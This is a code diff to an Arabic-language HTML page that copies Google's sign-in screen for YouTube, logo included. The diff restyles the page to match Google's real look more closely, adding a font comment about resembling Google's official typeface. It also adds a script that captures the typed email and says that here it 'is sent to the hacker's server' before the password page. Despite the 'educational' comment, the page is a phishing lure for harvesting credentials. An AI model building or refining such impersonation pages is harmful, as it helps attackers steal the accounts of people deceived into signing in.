@@ -3,16 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - Google</title>
+    <title>تسجيل الدخول - حسابات Google</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        /* إضافة خط يشبه خط جوجل الرسمي */
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        body { font-family: 'Roboto', arial, sans-serif; }
     </style>
 </head>
-<body class="bg-[#0b0b0b] text-[#e8eaed] flex items-center justify-center min-h-screen">
+<body class="bg-white text-[#202124] flex items-center justify-center min-h-screen">
 
-    <div class="w-full max-w-[450px] p-10 bg-[#0b0b0b] rounded-lg border border-gray-800 md:border-none">
-        <div class="flex justify-center mb-6">
+    <div class="w-full max-w-[450px] p-6 sm:p-10 border border-gray-200 rounded-lg shadow-sm">
+        
+        <div class="flex justify-center mb-4">
             <svg viewBox="0 0 24 24" width="48" height="48" xmlns="http://www.w3.org/2000/svg">
                 <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                 <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
@@ -21,39 +24,57 @@
             </svg>
         </div>
 
-        <h1 class="text-3xl text-center font-normal mb-3">تسجيل الدخول</h1>
-        <p class="text-center text-lg mb-10">المتابعة إلى YouTube</p>
+        <h1 class="text-2xl text-center font-normal mb-2">تسجيل الدخول</h1>
+        <p class="text-center text-base mb-8">المتابعة إلى YouTube</p>
 
-        <div class="relative mb-6">
-            <input type="text" id="email" class="w-full bg-transparent border border-gray-600 rounded-md p-4 text-lg focus:border-blue-400 focus:outline-none peer placeholder-transparent" placeholder="البريد الإلكتروني أو الهاتف">
-            <label for="email" class="absolute right-4 top-4 text-gray-400 transition-all pointer-events-none peer-focus:-top-3 peer-focus:right-2 peer-focus:text-sm peer-focus:text-blue-400 peer-focus:bg-[#0b0b0b] peer-focus:px-2">البريد الإلكتروني أو الهاتف</label>
+        <div class="relative mb-2">
+            <input type="email" id="id_email" 
+                class="w-full border border-gray-300 rounded-md p-4 text-base focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none peer transition-all"
+                placeholder=" " required>
+            <label for="id_email" 
+                class="absolute right-4 top-4 text-gray-500 transition-all pointer-events-none 
+                peer-placeholder-shown:text-base peer-placeholder-shown:top-4 
+                peer-focus:top-[-10px] peer-focus:right-2 peer-focus:text-xs peer-focus:text-blue-600 peer-focus:bg-white peer-focus:px-1
+                peer-[:not(:placeholder-shown)]:top-[-10px] peer-[:not(:placeholder-shown)]:right-2 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:bg-white peer-[:not(:placeholder-shown)]:px-1">
+                البريد الإلكتروني أو الهاتف
+            </label>
         </div>
 
-        <a href="#" class="text-blue-400 font-semibold text-sm hover:underline">هل نسيت بريدك الإلكتروني؟</a>
+        <button class="text-blue-600 text-sm font-medium hover:text-blue-700 mb-8 block">هل نسيت بريدك الإلكتروني؟</button>
 
-        <div class="mt-10 text-gray-400 text-sm leading-relaxed">
+        <div class="text-sm text-[#5f6368] mb-10 leading-relaxed">
             ألا تمتلك هذا الكمبيوتر؟ استخدم وضع الضيف لتسجيل الدخول بشكلٍ خاص. 
-            <a href="#" class="text-blue-400 font-semibold hover:underline">مزيد من المعلومات حول استخدام "وضع الضيف"</a>
+            <a href="#" class="text-blue-600 font-medium hover:underline">مزيد من المعلومات</a>
         </div>
 
-        <div class="flex justify-between items-center mt-12">
-            <a href="#" class="text-blue-400 font-semibold hover:bg-blue-900/20 p-2 rounded">إنشاء حساب</a>
-            <button class="bg-[#8ab4f8] text-[#202124] font-semibold px-6 py-2 rounded-full hover:bg-blue-300 transition-all">التالي</button>
-        </div>
-
-        <div class="flex justify-between mt-12 text-xs text-gray-400">
-            <select class="bg-transparent border-none focus:outline-none cursor-pointer">
-                <option>العربية</option>
-                <option>English</option>
-                <option>Français</option>
-            </select>
-            <div class="space-x-4 space-x-reverse">
-                <a href="#" class="hover:underline">المساعدة</a>
-                <a href="#" class="hover:underline">الخصوصية</a>
-                <a href="#" class="hover:underline">البنود</a>
-            </div>
+        <div class="flex justify-between items-center">
+            <button class="text-blue-600 font-medium hover:bg-blue-50 px-3 py-2 rounded transition-colors">إنشاء حساب</button>
+            <button id="nextBtn" class="bg-[#1a73e8] text-white font-medium px-6 py-2 rounded hover:bg-[#1b66c9] shadow-sm transition-all">التالي</button>
         </div>
     </div>
 
+    <div class="fixed bottom-4 w-full max-w-[450px] flex justify-between text-xs text-gray-600 px-4">
+        <select class="bg-transparent outline-none cursor-pointer hover:bg-gray-100 p-1 rounded">
+            <option>العربية</option>
+            <option>Français</option>
+            <option>English</option>
+        </select>
+        <div class="space-x-6 space-x-reverse">
+            <a href="#" class="hover:underline">المساعدة</a>
+            <a href="#" class="hover:underline">الخصوصية</a>
+            <a href="#" class="hover:underline">البنود</a>
+        </div>
+    </div>
+
+    <script>
+        // سكريبت بسيط لمحاكاة إرسال البيانات (لأغراض تعليمية)
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const email = document.getElementById('id_email').value;
+            if(email) {
+                console.log("تم اعتراض البيانات: " + email);
+                alert("تقنياً، هنا يتم إرسال الإيميل لـ 'سيرفر الهكر' قبل نقلك لصفحة الباسورد.");
+            }
+        });
+    </script>
 </body>
 </html>
